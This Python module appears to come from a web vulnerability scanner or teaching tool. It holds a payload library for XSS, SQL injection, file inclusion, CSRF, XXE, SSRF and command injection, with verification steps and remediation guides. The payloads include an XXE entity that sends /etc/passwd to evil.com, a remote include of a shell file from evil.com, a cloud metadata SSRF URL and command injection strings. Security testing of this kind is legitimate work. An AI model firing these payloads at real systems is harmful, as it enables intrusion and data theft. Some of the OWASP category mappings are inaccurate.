"""
Payload Generator for various vulnerability types
"""

import logging
from typing import List, Dict, Any, Optional
from enum import Enum
import random

logger = logging.getLogger(__name__)


class VulnerabilityType(Enum):
    """Types of vulnerabilities"""
    XSS = "xss"
    SQLI = "sqli"
    LFI = "lfi"
    RFI = "rfi"
    CSRF = "csrf"
    XXE = "xxe"
    SSRF = "ssrf"
    COMMAND_INJECTION = "command_injection"


class PayloadGenerator:
    """Generates payloads for different vulnerability types"""
    
    def __init__(self):
        self.payloads = self._initialize_payloads()
    
    def _initialize_payloads(self) -> Dict[VulnerabilityType, List[Dict[str, Any]]]:
        """Initialize payload database"""
        return {
            VulnerabilityType.XSS: [
                {
                    "name": "Basic XSS",
                    "payload": "<script>alert('XSS')</script>",
                    "description": "Basic reflected XSS payload",
                    "difficulty": "easy",
                    "owasp_ref": "A03:2021"
                },
                {
                    "name": "XSS with Event Handlers",
                    "payload": "<img src=x onerror=alert('XSS')>",
                    "description": "XSS using event handlers",
                    "difficulty": "medium",
                    "owasp_ref": "A03:2021"
                },
                {
                    "name": "DOM XSS",
                    "payload": "javascript:alert('XSS')",
                    "description": "DOM-based XSS payload",
                    "difficulty": "medium",
                    "owasp_ref": "A03:2021"
                },
                {
                    "name": "XSS Filter Bypass",
                    "payload": "<ScRiPt>alert('XSS')</ScRiPt>",
                    "description": "Case-insensitive XSS bypass",
                    "difficulty": "medium",
                    "owasp_ref": "A03:2021"
                },
                {
                    "name": "XSS with Encoding",
                    "payload": "&#60;script&#62;alert('XSS')&#60;/script&#62;",
                    "description": "HTML entity encoded XSS",
                    "difficulty": "hard",
                    "owasp_ref": "A03:2021"
                }
            ],
            VulnerabilityType.SQLI: [
                {
                    "name": "Basic SQL Injection",
                    "payload": "' OR 1=1--",
                    "description": "Basic boolean-based SQL injection",
                    "difficulty": "easy",
                    "owasp_ref": "A02:2021"
                },
                {
                    "name": "Union-based SQLi",
                    "payload": "' UNION SELECT NULL,NULL,NULL--",
                    "description": "Union-based SQL injection",
                    "difficulty": "medium",
                    "owasp_ref": "A02:2021"
                },
                {
                    "name": "Error-based SQLi",
                    "payload": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                    "description": "Error-based SQL injection",
                    "difficulty": "hard",
                    "owasp_ref": "A02:2021"
                },
                {
                    "name": "Time-based SQLi",
                    "payload": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                    "description": "Time-based blind SQL injection",
                    "difficulty": "hard",
                    "owasp_ref": "A02:2021"
                },
                {
                    "name": "Boolean-based SQLi",
                    "payload": "' AND 1=1--",
                    "description": "Boolean-based blind SQL injection",
                    "difficulty": "medium",
                    "owasp_ref": "A02:2021"
                }
            ],
            VulnerabilityType.LFI: [
                {
                    "name": "Basic LFI",
                    "payload": "../../../etc/passwd",
                    "description": "Basic local file inclusion",
                    "difficulty": "easy",
                    "owasp_ref": "A05:2021"
                },
                {
                    "name": "LFI with Null Byte",
                    "payload": "../../../etc/passwd%00",
                    "description": "LFI with null byte injection",
                    "difficulty": "medium",
                    "owasp_ref": "A05:2021"
                },
                {
                    "name": "LFI with Encoding",
                    "payload": "..%2F..%2F..%2Fetc%2Fpasswd",
                    "description": "URL encoded LFI",
                    "difficulty": "medium",
                    "owasp_ref": "A05:2021"
                },
                {
                    "name": "LFI with Double Encoding",
                    "payload": "..%252F..%252F..%252Fetc%252Fpasswd",
                    "description": "Double URL encoded LFI",
                    "difficulty": "hard",
                    "owasp_ref": "A05:2021"
                }
            ],
            VulnerabilityType.RFI: [
                {
                    "name": "Basic RFI",
                    "payload": "http://evil.com/shell.txt",
                    "description": "Basic remote file inclusion",
                    "difficulty": "easy",
                    "owasp_ref": "A05:2021"
                },
                {
                    "name": "RFI with PHP Wrapper",
                    "payload": "php://filter/convert.base64-encode/resource=index.php",
                    "description": "RFI using PHP wrapper",
                    "difficulty": "medium",
                    "owasp_ref": "A05:2021"
                }
            ],
            VulnerabilityType.CSRF: [
                {
                    "name": "Basic CSRF",
                    "payload": "<img src=\"http://target.com/change_password?new_password=hacked\" style=\"display:none\">",
                    "description": "Basic CSRF attack",
                    "difficulty": "easy",
                    "owasp_ref": "A01:2021"
                },
                {
                    "name": "CSRF with Form",
                    "payload": "<form action=\"http://target.com/change_password\" method=\"POST\"><input type=\"hidden\" name=\"new_password\" value=\"hacked\"><input type=\"submit\" value=\"Click here\"></form>",
                    "description": "CSRF with form submission",
                    "difficulty": "medium",
                    "owasp_ref": "A01:2021"
                }
            ],
            VulnerabilityType.XXE: [
                {
                    "name": "Basic XXE",
                    "payload": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
                    "description": "Basic XXE attack",
                    "difficulty": "medium",
                    "owasp_ref": "A05:2021"
                },
                {
                    "name": "XXE with Parameter Entity",
                    "payload": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE data [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://evil.com/?x=%file;'>\">%eval;%exfil;]><data>test</data>",
                    "description": "XXE with parameter entity",
                    "difficulty": "hard",
                    "owasp_ref": "A05:2021"
                }
            ],
            VulnerabilityType.SSRF: [
                {
                    "name": "Basic SSRF",
                    "payload": "http://localhost:8080/admin",
                    "description": "Basic SSRF to internal service",
                    "difficulty": "easy",
                    "owasp_ref": "A10:2021"
                },
                {
                    "name": "SSRF with Cloud Metadata",
                    "payload": "http://169.254.169.254/latest/meta-data/",
                    "description": "SSRF to AWS metadata service",
                    "difficulty": "medium",
                    "owasp_ref": "A10:2021"
                }
            ],
            VulnerabilityType.COMMAND_INJECTION: [
                {
                    "name": "Basic Command Injection",
                    "payload": "; ls -la",
                    "description": "Basic command injection",
                    "difficulty": "easy",
                    "owasp_ref": "A03:2021"
                },
                {
                    "name": "Command Injection with Pipe",
                    "payload": "| whoami",
                    "description": "Command injection with pipe",
                    "difficulty": "medium",
                    "owasp_ref": "A03:2021"
                },
                {
                    "name": "Command Injection with Backticks",
                    "payload": "`id`",
                    "description": "Command injection with backticks",
                    "difficulty": "medium",
                    "owasp_ref": "A03:2021"
                }
            ]
        }
    
    def generate_payloads(self, vuln_type: str, difficulty: str = "all", count: int = 3) -> List[Dict[str, Any]]:
        """Generate payloads for specific vulnerability type"""
        try:
            vuln_enum = VulnerabilityType(vuln_type.lower())
        except ValueError:
            logger.error(f"Unknown vulnerability type: {vuln_type}")
            return []
        
        available_payloads = self.payloads.get(vuln_enum, [])
        
        # Filter by difficulty
        if difficulty != "all":
            available_payloads = [p for p in available_payloads if p["difficulty"] == difficulty]
        
        # Randomly select payloads
        if len(available_payloads) <= count:
            selected_payloads = available_payloads
        else:
            selected_payloads = random.sample(available_payloads, count)
        
        logger.info(f"Generated {len(selected_payloads)} payloads for {vuln_type}")
        return selected_payloads
    
    def get_payload_info(self, vuln_type: str, payload_name: str) -> Optional[Dict[str, Any]]:
        """Get specific payload information"""
        try:
            vuln_enum = VulnerabilityType(vuln_type.lower())
        except ValueError:
            return None
        
        for payload in self.payloads.get(vuln_enum, []):
            if payload["name"] == payload_name:
                return payload
        
        return None
    
    def get_verification_steps(self, vuln_type: str) -> List[str]:
        """Get verification steps for vulnerability type"""
        verification_steps = {
            VulnerabilityType.XSS: [
                "1. Inject payload into input field",
                "2. Submit form or trigger action",
                "3. Check if JavaScript alert appears",
                "4. Verify payload is reflected in response",
                "5. Test in different contexts (HTML, JavaScript, CSS)"
            ],
            VulnerabilityType.SQLI: [
                "1. Inject payload into parameter",
                "2. Submit request",
                "3. Check for error messages or unexpected behavior",
                "4. Verify database response",
                "5. Test different injection techniques"
            ],
            VulnerabilityType.LFI: [
                "1. Inject file path into parameter",
                "2. Submit request",
                "3. Check if file contents are returned",
                "4. Verify file access",
                "5. Test different path traversal techniques"
            ],
            VulnerabilityType.RFI: [
                "1. Inject remote URL into parameter",
                "2. Submit request",
                "3. Check if remote file is included",
                "4. Verify remote code execution",
                "5. Monitor network traffic"
            ]
        }
        
        try:
            vuln_enum = VulnerabilityType(vuln_type.lower())
            return verification_steps.get(vuln_enum, [])
        except ValueError:
            return []
    
    def get_remediation_guide(self, vuln_type: str) -> Dict[str, str]:
        """Get remediation guide for vulnerability type"""
        remediation_guides = {
            VulnerabilityType.XSS: {
                "title": "XSS Prevention",
                "description": "Prevent Cross-Site Scripting attacks",
                "steps": [
                    "Validate and sanitize all user inputs",
                    "Use Content Security Policy (CSP)",
                    "Encode output to prevent script execution",
                    "Use modern frameworks with built-in XSS protection",
                    "Regular security testing and code review"
                ]
            },
            VulnerabilityType.SQLI: {
                "title": "SQL Injection Prevention",
                "description": "Prevent SQL Injection attacks",
                "steps": [
                    "Use parameterized queries or prepared statements",
                    "Validate and sanitize all inputs",
                    "Use ORM frameworks",
                    "Implement least privilege principle",
                    "Regular security testing and code review"
                ]
            },
            VulnerabilityType.LFI: {
                "title": "LFI Prevention",
                "description": "Prevent Local File Inclusion attacks",
                "steps": [
                    "Validate file paths and restrict access",
                    "Use whitelist approach for allowed files",
                    "Implement proper file permissions",
                    "Use secure file handling libraries",
                    "Regular security testing and code review"
                ]
            }
        }
        
        try:
            vuln_enum = VulnerabilityType(vuln_type.lower())
            return remediation_guides.get(vuln_enum, {})
        except ValueError:
            return {}
